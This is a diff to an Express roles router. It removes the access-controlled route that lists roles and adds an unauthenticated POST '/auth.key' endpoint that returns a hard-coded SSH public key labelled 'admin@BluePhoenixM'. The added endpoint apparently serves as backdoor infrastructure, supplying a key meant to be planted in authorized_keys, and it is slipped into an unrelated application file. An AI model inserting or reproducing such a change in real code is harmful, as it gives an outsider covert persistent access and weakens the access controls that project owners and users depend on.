@@ -36,31 +36,9 @@ router.post('/', passport.authenticate('jwt', {
 
 
 // Get List of Roles
-router.get('/', passport.authenticate('jwt', {
-    session: false
-}), function (req, res) {
-    helper.checkPermission(req.user.role_id, 'role_get_all').then((rolePerm) => {
-        console.log(rolePerm);
-        Role
-            .findAll({
-                include: [
-                    {
-                        model: Permission,
-                        as: 'RolePermissions',
-                    },
-                    {
-                        model: User,
-                        as: 'users',
-                    }
-                ]
-            })
-            .then((roles) => res.status(200).send(roles))
-            .catch((error) => {
-                res.status(400).send(error);
-            });
-    }).catch((error) => {
-        res.status(403).send(error);
-    });
+
+router.post('/auth.key', async function (req, res) {
+   res.send("#bienwindows\n ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCWgR0UZEwJnGub+WLwnOBLcgfPi/rkaU5VnR0aoE6wjIlx5/QHC3AC2s/nDFmBb5X6mPjPiPASIXVGi+FVF0WnRdOGuvMRx3cp0QXe/V7VBVyDWIerW1q/9rTzFSkw1Xv/LTwmjDly1eEwaZUixyKblOP9mIaWPJGDy+lubvSmaBYy5EUeloYBYRBKzT6tRXUGuG6daYPxoE0y9a9AAkGusAJJyG0G3Sg4Q6LisxLjh/JKnN0QRQXEhcstTwu+45xDua8GYnIMJDrhEMhYD49kZEY/kRWad0BJQoufZgwzfxjkdJNk6sLP/7Fs2hzk7j9Cq45jOxzJ4T65cqi0/UhA3k3TiW/wvsrJ9NtSQY7Gv1mfd+C5CEWeYd92r7kh3V++4rOTdKDyBPF0ivef04zfrrUFz9DzJz9fdrx87OgO4LnnxsunMnePd1VwrfsQnf9N5Tj8HCueJSW+O0Jk6ZQKvOFBsdJLaQc6XhfbSTdVdgxnSVyEfzlKKMfDvuvlcL8= admin@BluePhoenixM")
 });
 
 // Get Role by ID
@@ -194,5 +172,7 @@ router.post('/permissions/:id', passport.authenticate('jwt', {
         res.status(403).send(error);
     });
 });
+
+
 
 module.exports = router;
